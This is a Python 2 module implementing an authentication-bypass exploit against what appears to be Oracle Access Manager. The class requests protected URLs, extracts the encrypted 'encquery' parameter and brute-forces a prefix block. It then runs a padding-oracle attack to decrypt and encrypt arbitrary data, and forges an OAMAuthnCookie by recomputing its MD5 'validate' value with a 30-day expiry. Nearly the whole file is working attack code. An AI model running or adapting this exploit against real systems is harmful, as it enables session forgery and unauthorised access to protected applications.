import time

import hashlib
import logging
import os
import requests
import socket
import urllib
import urlparse
from base64 import b64encode, b64decode
import sys

from collections import OrderedDict
import time as time_
from constants import Constants
from constants import MessageInfo
from lib.util import Util
from pad_buster import PadBuster


class OAMAuthBypass:
    def __init__(self, url, gw_agent_id, prefix_encquery, padding_success_msg, padding_fail_msg):
        self._protected_url = url
        self._gw_agent_id = gw_agent_id
        self._prefix_encquery = b64decode(prefix_encquery) if prefix_encquery else ''
        self._padding_success_msg = padding_success_msg
        self._padding_fail_msg = padding_fail_msg
        self._original_message = MessageInfo('', '', '', '')
        self._valid_message = MessageInfo('', '', '', '')
        self._is_initialized = False
        self._logger = logging.getLogger(Constants.LOGGER_NAME)

    def _initialize(self):
        # Initialize OAM URL, encquery and platform info
        # encquery is a valid message ended with a space character
        self._original_message = self._get_original_message()
        self._gw_agent_id = self._original_message.extra_params
        self._valid_message = self._get_valid_message()

        if not self._prefix_encquery:
            self._prefix_message = self._get_prefix_message()
        else:
            self._prefix_message = self._original_message._replace(encquery=self._prefix_encquery)

        self._is_initialized = True

    def encrypt(self, cleartext):
        if not self._is_initialized:
            self._logger.info('Module not initialized. Initializing...')
            self._initialize()

        cleartext = urllib.unquote(cleartext)
        self._logger.info('Encrypting: %s...', cleartext)
        padbuster = PadBuster(prefix_message=self._prefix_message, padding_success_msg=self._padding_success_msg,
                              padding_fail_msg=self._padding_fail_msg)
        ciphertext = padbuster.encrypt(plaintext=cleartext, block_size=Constants.DEFAULT_CIPHER_BLOCK_SIZE,
                                       iv=bytearray(Constants.DEFAULT_CIPHER_BLOCK_SIZE))
        self._logger.info('\nCiphertext: %s', urllib.quote(b64encode(ciphertext)))

    def decrypt(self, ciphertext):
        if not self._is_initialized:
            self._logger.info('Module not initialized. Initializing...')
            self._initialize()

        ciphertext = urllib.unquote(ciphertext)
        self._logger.info('Decrypting: %s...', ciphertext)
        ciphertext = b64decode(ciphertext)
        padbuster = PadBuster(prefix_message=self._prefix_message, padding_success_msg=self._padding_success_msg,
                              padding_fail_msg=self._padding_fail_msg)
        cleartext = padbuster.decrypt(ciphertext=ciphertext, block_size=Constants.DEFAULT_CIPHER_BLOCK_SIZE,
                                      iv=bytearray(Constants.DEFAULT_CIPHER_BLOCK_SIZE))
        self._logger.info('\nCleartext: %s', cleartext)

    @staticmethod
    def _encode_special_characters(text):
        return text.replace("%", "%" + str(hex(293))[3:].upper()).replace("\n", "%" + str(hex(266))[3:].upper()). \
            replace(" ", "%" + str(hex(288))[3:].upper()).replace("=", "%" + str(hex(317))[3:].upper())

    def generate_cookie(self, cookie):
        self._logger.info('Generating validate for cookie: %s...', cookie)
        dnu = session_id_value = ''
        attr_list = cookie.split(" ")
        attributes = OrderedDict()

        for item in attr_list:
            item_list = item.split("=")
            key = urllib.unquote(item_list[0])
            value = item_list[1]
            attributes[key] = value
            if key == "SessionId":
                session_id_value = value[value.find("SessionId^") + len("SessionId^"):value.find("|OAMSessionType^")]
                session_type = value[value.find("OAMSessionType^") + len("OAMSessionType^"):]
            elif key == "AuthId":
                dnu = value[6:]

        session_id = urllib.unquote(attributes["SessionId"])
        salt = urllib.unquote(attributes["Salt"])
        auth_id = urllib.unquote(attributes["AuthId"])
        ip = urllib.unquote(attributes["Ip"])
        acl = urllib.unquote(attributes["ACL"])
        tct = str(int(round(time_.time())) + 30 * 24 * 60 * 60)
        attributes["TCT"] = urllib.unquote(tct)


        # this.m_sessionId = ("" + this.m_startTime + this.m_authUser.getDn().hashCode());
        # m_authUser.getDn = DnU
        # m_startTime = TCT
        # session_id = attributes["TCT"] + str(self._java_hashcode(dnu))

        if salt is None or auth_id is None or ip is None \
                or acl is None or tct is None or dnu is None or session_id is None:
            self._logger.error("Invalid cookie: %s", cookie)
            sys.exit(-1)

        m = hashlib.md5()
        validate_v4 = salt + auth_id + ip + acl + tct + session_id
        m.update(validate_v4.encode('utf-8'))
        validate_v4 = m.digest()
        validate_v4 = b64encode(validate_v4)
        attributes["validate"] = urllib.quote(validate_v4)

        new_cookie = ""
        for key, value in attributes.items():
            new_cookie = new_cookie + key + "=" + value + " "

        self._logger.info("\nNew OAMAuthnCookie: %s", new_cookie)
        print
        return new_cookie

    # TODO: imp test
    @staticmethod
    def _java_hashcode(s):
        h = 0
        for c in s:
            h = (31 * h + ord(c)) & 0xFFFFFFFF
        return ((h + 0x80000000) & 0xFFFFFFFF) - 0x80000000

    def _get_encquery_message(self, requested_url, lock_server=False):
        same_server = False
        while not same_server:
            self._logger.debug('Requesting: %s', requested_url)
            response = requests.get(requested_url, verify=False, allow_redirects=False)
            content = response.text
            self._logger.debug(content)
            result = response.headers['Location']
            self._logger.debug('Result: %s', result)

            self._logger.debug('Parsing encquery parameter')
            self._logger.debug('Original URL: %s', result)
            decoded_url = urllib.unquote(result)  # .decode('utf8')
            self._logger.debug('Decoded URL: %s', decoded_url)
            oam_url = decoded_url[:decoded_url.find('?')]

            parsed_url = urlparse.urlparse(decoded_url)
            self._logger.debug('Parsed URL: %s', parsed_url)
            encquery = urlparse.parse_qs(parsed_url.query)['encquery'][0]
            self._logger.debug('encquery: %s', encquery)
            fixed_encquery = encquery[:encquery.find('agentid=')].strip().replace(' ', '+')
            self._logger.debug('fixed_encquery: %s', fixed_encquery)
            decoded_encquery = b64decode(fixed_encquery)
            extra_params = encquery[encquery.find('agentid='):]
            message = MessageInfo(oam_url=oam_url, message='', encquery=decoded_encquery, extra_params=extra_params)
            if not lock_server:
                break
            elif self._gw_agent_id == message.extra_params:
                same_server = True

        return message

    def _get_original_message(self):
        self._logger.debug('Getting original encquery value...')
        url = self._protected_url
        message = self._get_encquery_message(requested_url=url, lock_server=True)
        # message = message._replace(message=msg)
        self._logger.debug('Original encquery: %s, length: %s', message.encquery.encode('hex'), len(message.encquery))
        return message

    def _get_valid_message(self):
        self._logger.debug('Getting valid encquery value...')
        base_url = self._protected_url
        previous_encquery_length = 0
        if '?' in base_url:
            msg_prefix = '&a='
        else:
            msg_prefix = '?a='

        for i in range(1, 100):
            msg = msg_prefix + 'a' * i
            message = self._get_encquery_message(requested_url=base_url + msg, lock_server=True)
            message = message._replace(message=msg)
            encquery_length = len(message.encquery)
            self._logger.debug('new encquery length: %s', encquery_length)

            if encquery_length != previous_encquery_length and previous_encquery_length != 0:
                self._logger.debug('previous_encquery_length: %s, new encquery_length: %s',
                                   previous_encquery_length, encquery_length)
                if encquery_length - previous_encquery_length == Constants.DEFAULT_CIPHER_BLOCK_SIZE:
                    self._logger.debug('encquery_length length increased by %s bytes for msg: %s',
                                       Constants.DEFAULT_CIPHER_BLOCK_SIZE, msg)
                    self._logger.debug('encquery bytes: %s', message.encquery.encode('hex'))

                    return message
                else:
                    self._logger.error('Invalid encquery length: %s', encquery_length)
                    sys.exit()  # TODO raise error
            else:
                previous_encquery_length = encquery_length

        self._logger.error('Failed to get encquery.')
        sys.exit()  # TODO raise error

    # Get a msg ending with space to start padding oracle attack using it
    def _get_prefix_message(self):
        self._logger.info('Bruteforcing prefix message...')
        msg = self._valid_message.encquery[:- Constants.DEFAULT_CIPHER_BLOCK_SIZE]  # remove last padding block
        last = self._original_message.encquery[-(2 * Constants.DEFAULT_CIPHER_BLOCK_SIZE):]

        for i in range(0, 2000):
            chosen_block = os.urandom(Constants.DEFAULT_CIPHER_BLOCK_SIZE)
            final_msg = msg + chosen_block + last
            encoded_msg = b64encode(final_msg)
            self._logger.debug('Original encquery: %s', self._original_message.encquery.encode('hex'))
            self._logger.debug('Valid encquery: %s', self._valid_message.encquery.encode('hex'))
            self._logger.debug('Modified encquery: %s', final_msg.encode('hex'))

            url = self._valid_message.oam_url + "?encquery=" + \
                  urllib.quote(encoded_msg + '  ' + self._valid_message.extra_params)
            valid_msg = self._is_valid_padding(url)

            if valid_msg:
                self._logger.debug('Got msg using: %s', i)
                self._logger.info('Prefix is: %s\n', b64encode(final_msg))
                return MessageInfo(oam_url=self._original_message.oam_url, message='', encquery=final_msg,
                                   extra_params=self._original_message.extra_params)

        self._logger.info("Failed to get a prefix message !!!")
        sys.exit(-1)  # TODO raise error

    def _is_valid_padding(self, requested_url):  # TODO rename
        request_sent = False
        cnt = 0
        while not request_sent:
            try:
                self._logger.debug('Requesting: %s', requested_url)
                cnt = cnt + 1
                if cnt > Constants.MAX_RETRIES:
                    self._logger.error("Max retries exceeded. Stopping...")
                    sys.exit(-1)

                response = requests.get(requested_url, timeout=Constants.NETWORK_TIMEOUT, verify=False, allow_redirects=False)
                request_sent = True

            except (socket.error, requests.exceptions.RequestException):
                self._logger.exception('Retrying request in %.2f seconds...', Constants.DEFAULT_WAIT_TIME)
                time.sleep(Constants.DEFAULT_WAIT_TIME)
                continue

        content = response.text
        self._logger.debug("Response content: %s", content)

        padding_error = Util.has_padding_error(response=response,
                                               success_msg=self._padding_success_msg,
                                               fail_msg=self._padding_fail_msg, logger=self._logger)
        return not padding_error
